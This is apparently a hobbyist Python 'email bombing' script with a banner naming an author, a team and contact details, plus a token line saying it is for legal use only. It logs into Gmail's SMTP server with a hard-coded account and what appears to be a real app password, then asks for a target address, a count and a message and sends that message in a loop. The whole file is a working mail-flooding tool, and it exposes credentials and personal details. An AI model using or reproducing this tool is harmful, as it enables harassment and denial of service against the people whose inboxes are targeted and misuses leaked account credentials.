#sender = "your_email@gmail.com"
#receiver = "receiver_email@gmail.com"
#password = "your_16_digit_app_password"

#Email Bomming 
import os
import time

os.system("clear")
time.sleep(0.5)


print("""


8888888b.        d8888 8888888b.  888    d8P         .d8888b.   .d8888b.  
888  "Y88b      d88888 888   Y88b 888   d8P         d88P  Y88b d88P  Y88b 
888    888     d88P888 888    888 888  d8P          888        888    888 
888    888    d88P 888 888   d88P 888d88K           888d888b.  Y88b. d888 
888    888   d88P  888 8888888P"  8888888b          888P "Y88b  "Y888P888 
888    888  d88P   888 888 T88b   888  Y88b  888888 888    888        888 
888  .d88P d8888888888 888  T88b  888   Y88b        Y88b  d88P Y88b  d88P 
8888888P" d88P     888 888   T88b 888    Y88b        "Y8888P"   "Y8888P"  
                                                                          


                                                                          
                                                                          
                                                    

\033[1;35m______________________________________________________________
Tools Owner  : Abdullah 
Team            :Muslim fighter 
GitHub          :$$$$$$$$$$
Email             :mdabdullah@gmail.com
mobile           :0176876767667
Use Only for legal work Not Use For Ileg work

\033[1;35m_______________________________________________________________
                                                                      
                                                                      
                                                                      

""")

import smtplib
server= smtplib.SMTP("smtp.gmail.com", "587")

server.ehlo()
server.starttls()

server.login("rfprogramminghub@gmail.com", "xiitwggtdcrhmzak")

to= input ("Enter Your Target Eamil : ")
limit=int (input ("Enter Limit :"))
msg=input ("Enter Message :")


for i in range(limit):
    server.sendmail("rfprogramminghub@gmail.com",to,msg)
    print(f"{i}Mail Send Successfully..")
